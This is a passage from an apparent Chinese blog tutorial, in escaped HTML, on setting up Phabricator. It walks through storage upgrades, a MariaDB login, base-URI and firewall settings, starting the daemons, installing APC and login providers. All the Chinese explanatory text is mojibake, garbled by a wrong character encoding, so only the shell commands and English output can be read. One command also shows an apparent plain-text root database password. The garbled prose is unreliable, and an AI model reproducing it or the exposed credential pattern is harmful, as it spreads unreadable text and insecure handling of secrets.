&lt;h4 id=&quot;é‡æ–°åˆå§‹åŒ–æ•°æ®åº“ï¼š&quot;&gt;&lt;a href=&quot;#é‡æ–°åˆå§‹åŒ–æ•°æ®åº“ï¼š&quot; class=&quot;headerlink&quot; title=&quot;é‡æ–°åˆå§‹åŒ–æ•°æ®åº“ï¼š&quot;&gt;&lt;/a&gt;é‡æ–°åˆå§‹åŒ–æ•°æ®åº“ï¼š&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@Phabricator phabricator]&lt;span class=&quot;comment&quot;&gt;# ./bin/storage upgrade&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Before running storage upgrades, you should take down the Phabricator web&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;interface and stop any running Phabricator daemons (you can &lt;span class=&quot;built_in&quot;&gt;disable&lt;/span&gt; this&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;warning with --force).&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    Are you ready to &lt;span class=&quot;built_in&quot;&gt;continue&lt;/span&gt;? [y/N] y&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Loading quickstart template onto &lt;span class=&quot;string&quot;&gt;&quot;localhost:3306&quot;&lt;/span&gt;...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Applying patch &lt;span class=&quot;string&quot;&gt;&quot;phabricator:db.packages&quot;&lt;/span&gt; to host &lt;span class=&quot;string&quot;&gt;&quot;localhost:3306&quot;&lt;/span&gt;...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Applying patch &lt;span class=&quot;string&quot;&gt;&quot;phabricator:20160201.revision.properties.1.sql&quot;&lt;/span&gt; to host &lt;span class=&quot;string&quot;&gt;&quot;localhost:3306&quot;&lt;/span&gt;...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Applying patch &lt;span class=&quot;string&quot;&gt;&quot;phabricator:20160201.revision.properties.2.sql&quot;&lt;/span&gt; to host &lt;span class=&quot;string&quot;&gt;&quot;localhost:3306&quot;&lt;/span&gt;...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Applying patch &lt;span class=&quot;string&quot;&gt;&quot;phabricator:20160706.phame.blog.parentdomain.2.sql&quot;&lt;/span&gt; to host &lt;span class=&quot;string&quot;&gt;&quot;localhost:3306&quot;&lt;/span&gt;...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Applying patch &lt;span class=&quot;string&quot;&gt;&quot;phabricator:20160706.phame.blog.parentsite.1.sql&quot;&lt;/span&gt; to host &lt;span class=&quot;string&quot;&gt;&quot;localhost:3306&quot;&lt;/span&gt;...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Applying patch &lt;span class=&quot;string&quot;&gt;&quot;phabricator:20160707.calendar.01.stub.sql&quot;&lt;/span&gt; to host &lt;span class=&quot;string&quot;&gt;&quot;localhost:3306&quot;&lt;/span&gt;...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Applying patch &lt;span class=&quot;string&quot;&gt;&quot;phabricator:20160711.files.01.builtin.sql&quot;&lt;/span&gt; to host &lt;span class=&quot;string&quot;&gt;&quot;localhost:3306&quot;&lt;/span&gt;...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.....&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;.....&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Missing Key&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;phabricator_search       search_documentfield     corpus            Surplus Key&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;phabricator_search       search_documentfield     key_corpus        Missing Key&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;phabricator_worker       worker_archivetask       key_modified      Missing Key&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Applying schema adjustments...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Done.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Completed applying all schema adjustments.&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;8-æŸ¥çœ‹æ•°æ®åº“ï¼š&quot;&gt;&lt;a href=&quot;#8-æŸ¥çœ‹æ•°æ®åº“ï¼š&quot; class=&quot;headerlink&quot; title=&quot;8 æŸ¥çœ‹æ•°æ®åº“ï¼š&quot;&gt;&lt;/a&gt;8 æŸ¥çœ‹æ•°æ®åº“ï¼š&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@Phabricator phabricator]&lt;span class=&quot;comment&quot;&gt;# mysql -uroot -pqwde1dsdfg3.com&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Welcome to the MariaDB monitor.  Commands end with ; or \g.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Your MariaDB connection id is 177&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Server version: 5.5.52-MariaDB MariaDB Server&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Copyright (c) 2000, 2016, Oracle, MariaDB Corporation Ab and others.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Type &lt;span class=&quot;string&quot;&gt;&#39;help;&#39;&lt;/span&gt; or &lt;span class=&quot;string&quot;&gt;&#39;\h&#39;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; help. Type &lt;span class=&quot;string&quot;&gt;&#39;\c&#39;&lt;/span&gt; to clear the current input statement.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;MariaDB [(none)]&amp;gt; show databases;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;+--------------------------+&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| Database                 |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;+--------------------------+&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| information_schema       |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| mysql                    |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| performance_schema       |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_almanac      |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_audit        |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_auth         |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_badges       |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_cache        |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_calendar     |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_chatlog      |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_conduit      |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_config       |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_conpherence  |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_countdown    |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_daemon       |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_dashboard    |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_differential |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_diviner      |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_doorkeeper   |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_draft        |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_drydock      |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_fact         |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_feed         |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_file         |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_flag         |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;| phabricator_fund         |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;|      .......             |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;+--------------------------+&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;61 rows &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; (0.01 sec)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;â—ï¸â—ï¸æ³¨ï¼šupgradeä¹‹åï¼Œshow databasesä½ ä¼šå‘ç°å»ºç«‹äº†è®¸å¤šphabrictorå¼€å¤´çš„æ•°æ®åº“ã€‚&lt;/p&gt;
&lt;p&gt;###8.1 é…ç½®URLï¼š&lt;/p&gt;
&lt;p&gt;æœªé…ç½®æ­¤å®‰è£…çš„åŸºæœ¬URIï¼Œå¹¶ä¸”åœ¨é…ç½®ä¹‹å‰ï¼Œä¸»è¦åŠŸèƒ½å°†æ— æ³•æ­£å¸¸å·¥ä½œã€‚&lt;br&gt;æ‚¨åº”è¯¥å°†åŸºæœ¬URIè®¾ç½®ä¸ºæ‚¨å°†ç”¨äºè®¿é—®Phabricatorçš„URIï¼Œå¦‚â€œ&lt;a href=&quot;http://phabricator.example.com/â€ã€‚&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://phabricator.example.com/â€ã€‚&lt;/a&gt;&lt;br&gt;å¦‚æœä½¿ç”¨çš„ç«¯å£ä¸æ˜¯80ï¼ˆhttpï¼‰æˆ–443ï¼ˆhttpsï¼‰ï¼Œè¯·åŒ…æ‹¬åè®®ï¼ˆhttpæˆ–httpsï¼‰ï¼ŒåŸŸåå’Œç«¯å£å·ã€‚&lt;br&gt;åŸºäºæ­¤è¯·æ±‚ï¼Œæ­£ç¡®çš„è®¾ç½®ä¼¼ä¹æ˜¯ï¼š&lt;code&gt;http : //phabricator.ihaozhuo.com/&lt;/code&gt;&lt;br&gt;è¦é…ç½®åŸºæœ¬URIï¼Œè¯·è¿è¡Œä»¥ä¸‹å‘½ä»¤ã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@Phabricator phabricator]&lt;span class=&quot;comment&quot;&gt;#  ./bin/config set phabricator.base-uri &#39;http://phabricator.ihaozhuo.com/&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Set &lt;span class=&quot;string&quot;&gt;&#39;phabricator.base-uri&#39;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt; configuration.&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;9-è®¾ç½®é˜²ç«å¢™&quot;&gt;&lt;a href=&quot;#9-è®¾ç½®é˜²ç«å¢™&quot; class=&quot;headerlink&quot; title=&quot;9 è®¾ç½®é˜²ç«å¢™&quot;&gt;&lt;/a&gt;9 è®¾ç½®é˜²ç«å¢™&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;firewall-cmd --zone=public --permanent --add-service=http&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;firewall-cmd --reload&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;9-1-Phabricator-Daemons-Are-Not-Running&quot;&gt;&lt;a href=&quot;#9-1-Phabricator-Daemons-Are-Not-Running&quot; class=&quot;headerlink&quot; title=&quot;9.1 Phabricator Daemons Are Not Running&quot;&gt;&lt;/a&gt;9.1 Phabricator Daemons Are Not Running&lt;/h3&gt;&lt;p&gt;å¯åŠ¨å®ˆæŠ¤è¿›ç¨‹&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;phabricator/ $ ./bin/phd start&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;10-å®Œæˆå®‰è£…&quot;&gt;&lt;a href=&quot;#10-å®Œæˆå®‰è£…&quot; class=&quot;headerlink&quot; title=&quot;10 å®Œæˆå®‰è£…&quot;&gt;&lt;/a&gt;10 å®Œæˆå®‰è£…&lt;/h3&gt;&lt;p&gt;é…ç½®phabricatorï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; /var/www/html/phabricator/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;./bin/config &lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; phabricator.base-uri &lt;span class=&quot;string&quot;&gt;&#39;http://your_domain_or_IP&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;./bin/phd start&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ä½¿ç”¨æµè§ˆå™¨è®¿é—®ï¼š&lt;a href=&quot;http://your_domain_or_IP&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://your_domain_or_IP&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åæ ¹æ®æç¤ºä¿®å¤ä¸€äº›é—®é¢˜ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Phabricator_01.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ç™»å½•è¿›æ¥ç®¡ç†ç•Œé¢ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Phabricator_02.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;åˆ›å»ºé¡¹ç›®ä¾‹å­ï¼š&quot;&gt;&lt;a href=&quot;#åˆ›å»ºé¡¹ç›®ä¾‹å­ï¼š&quot; class=&quot;headerlink&quot; title=&quot;åˆ›å»ºé¡¹ç›®ä¾‹å­ï¼š&quot;&gt;&lt;/a&gt;åˆ›å»ºé¡¹ç›®ä¾‹å­ï¼š&lt;/h3&gt;&lt;p&gt; Projects â€”â€”ã€‹ Create Project â€”â€”ã€‹å¡«å†™å¥½é¡¹ç›®åç§° â€”â€”ã€‹Create New Project &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Phabricator_03.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;åˆ›å»ºå®Œæˆæ•ˆæœï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Phabricator_04.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;å®‰è£…å®Œæˆä»¥åå‡ºç°10å¤šä¸ªé—®é¢˜è§£å†³ï¼š&quot;&gt;&lt;a href=&quot;#å®‰è£…å®Œæˆä»¥åå‡ºç°10å¤šä¸ªé—®é¢˜è§£å†³ï¼š&quot; class=&quot;headerlink&quot; title=&quot;å®‰è£…å®Œæˆä»¥åå‡ºç°10å¤šä¸ªé—®é¢˜è§£å†³ï¼š&quot;&gt;&lt;/a&gt;å®‰è£…å®Œæˆä»¥åå‡ºç°10å¤šä¸ªé—®é¢˜è§£å†³ï¼š&lt;/h3&gt;&lt;p&gt;æ±‰åŒ–ç¿»è¯‘è¿‡æ¥ï¼š&lt;br&gt; &lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/phabricator_05.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;â“è¯´æ˜ï¼šæŒ‰é—®é¢˜æç¤ºæ“ä½œè§£å†³æ•…éšœã€‚ä¸€èˆ¬éƒ½æœ‰é—®é¢˜ä¿®å¤è§£å†³æ–¹æ³•çš„ï¼Œå®˜æ–¹è¿™ç‚¹è¿˜æ˜¯å¾ˆä¸é”™çš„ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ£˜æ‰‹é—®é¢˜1 å¦‚æœé‡åˆ°è¿™ä¸ªé—®é¢˜ï¼šAlternate File Domain Not Configured&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æ“ä½œäº†è¿™æ¡å‘½ä»¤å¤±æ•ˆ æœ€å¥½åˆ«æ“ä½œï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;phabricator/ $ ./bin/config &lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; security.alternate-file-domain &amp;lt;domain&amp;gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@Phabricator phabricator]&lt;span class=&quot;comment&quot;&gt;# ./bin/config set security.alternate-file-domain http://cdn.phabricator.com&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å¦‚æœæ˜¯CDNæ•°æ®å­˜æ”¾å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‘½ä»¤ã€‚ä¸ç„¶ä¼šå‡ºç°è®¿é—®å¤±è´¥ã€‚&lt;br&gt;æˆ‘æ˜¯å‚è€ƒè¿™ç¯‡æ–‡æ¡£è§£å†³é—®é¢˜ï¼š&lt;a href=&quot;https://community.bitnami.com/t/phabricator-not-rendering-resources-over-https/39005&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Phabricator not rendering resources over https&lt;/a&gt;åˆ é™¤&lt;code&gt;security.alternate-file-domain&lt;/code&gt;å¯ä»¥è®¿é—®ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æ£˜æ‰‹é—®é¢˜2 PHP Extension â€˜APCâ€™ Not Installed  å‚è€ƒæ–‡ç« ï¼š&lt;a href=&quot;http://php.net/manual/zh/apc.installation.php&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;PHP Extension â€˜APCâ€™ Not Installed&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# yum install php-pear&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# pecl install apc&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# echo &quot;extension=apc.so&quot; &amp;gt;&amp;gt; /etc/php.ini&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# echo &quot;apc.enabled=1&quot; &amp;gt;&amp;gt; /etc/php.ini&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# cp /usr/share/pear/apc.php /var/www/html/apc.php (this step is optional)&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# /etc/init.d/httpd restart&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;phabricatorå®˜ç½‘é…ç½®è¯´æ˜&lt;a href=&quot;https://secure.phabricator.com/book/phabricator/article/configuration_guide/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Configuration Guide&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;1-èº«ä»½éªŒè¯æä¾›è€…&quot;&gt;&lt;a href=&quot;#1-èº«ä»½éªŒè¯æä¾›è€…&quot; class=&quot;headerlink&quot; title=&quot;1. èº«ä»½éªŒè¯æä¾›è€…&quot;&gt;&lt;/a&gt;1. èº«ä»½éªŒè¯æä¾›è€…&lt;/h3&gt;&lt;p&gt;Phabricatorç™»å½•çš„æ–¹æ³•è¢«ç§°ä¸ºèº«ä»½éªŒè¯æä¾›è€…ï¼ˆAuthentication Providersï¼‰ã€‚ä¾‹å¦‚,å½“æˆ‘ä»¬è®¾ç½®äº†ä¸€ä¸ªâ€ç”¨æˆ·å/å¯†ç â€èº«ä»½éªŒè¯æä¾›è€…,é‚£ä¹ˆç”¨æˆ·å¯ä»¥é€šè¿‡ä¼ ç»Ÿçš„ç”¨æˆ·åå’Œå¯†ç ç™»å½•ã€‚Phabricatoræ”¯æŒå¤šç§ç™»å½•ç³»ç»Ÿã€‚å½“æˆ‘ä»¬ä½¿ç”¨Administratorsç™»å½•åˆ°åå°ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¯ç”¨æˆ–ç¦ç”¨è¿™äº›Providersï¼Œé…ç½®ç”¨æˆ·å¦‚ä½•æ³¨å†Œæˆ–ç™»å½•åˆ°Phabricatorã€‚&lt;/p&gt;
&lt;p&gt;åœ¨å…¬å¸å†…éƒ¨ä½¿ç”¨ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä½¿ç”¨&lt;code&gt;Username/Password&lt;/code&gt;æˆ–LDAPï¼Œå¯¹äºå¼€æºé¡¹ç›®ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ç±»ä¼¼äºGitHubç­‰OAuthç¬¬ä¸‰æ–¹ç™»å½•ã€‚åœ¨ä½¿ç”¨&lt;code&gt;Username/Password&lt;/code&gt;ç™»å½•æ–¹å¼æ—¶ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é™åˆ¶æ³¨å†Œç”¨æˆ·æ—¶çš„é‚®ç®±åç¼€ï¼Œæˆ‘ä»¬å¯ä»¥è®¾ç½®æˆå…¬å¸çš„é‚®ç®±åŸŸåã€‚&lt;/p&gt;
